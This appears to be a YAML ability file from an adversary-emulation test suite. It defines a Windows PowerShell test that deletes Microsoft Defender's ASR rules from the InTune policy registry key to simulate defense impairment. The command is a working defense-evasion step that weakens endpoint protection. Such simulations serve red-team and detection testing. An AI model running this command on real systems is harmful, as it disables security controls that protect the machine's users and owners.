- requirements: []
  name: Soumaia ART Tests - Delete Microsoft Defender ASR Rules - InTune
  description: This test simulates the deletion of the ASR rules loaded by Microsoft Defender using the registry. Depending on the deployment, rules can be pushed either using GPO or InTune, This test simulates an InTune-based rules deployment. (requires elevation)
  tactic: defense-impairment
  technique_id: T1685
  technique_name: Disable or Modify Tools
  executors:
  - cleanup: []
    timeout: 60
    platform: windows
    name: psh
    payloads: []
    parsers: []
    command: '$registryPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Policy Manager"; if (-not (Test-Path $registryPath)) { New-Item -Path $registryPath -Force; Write-Host "Registry key created: $registryPath" }; $registryValueName = "ASRRules"; if (Test-Path "$registryPath\$registryValueName") { Remove-ItemProperty -Path $registryPath -Name $registryValueName; Write-Host "Registry value deleted: $registryValueName" } else { New-ItemProperty -Path $registryPath -Name $registryValueName -PropertyType String -Value "36190899-1602-49e8-8b27-eb1d0a1ce869=1" -Force; Write-Host "Registry value created: $registryValueName" }; Remove-ItemProperty -Path $registryPath -Name $registryValueName; Write-Host "Registry value deleted: $registryValueName"'
  id: 949a0f52-705f-5f2e-80ff-d4f01de2d150
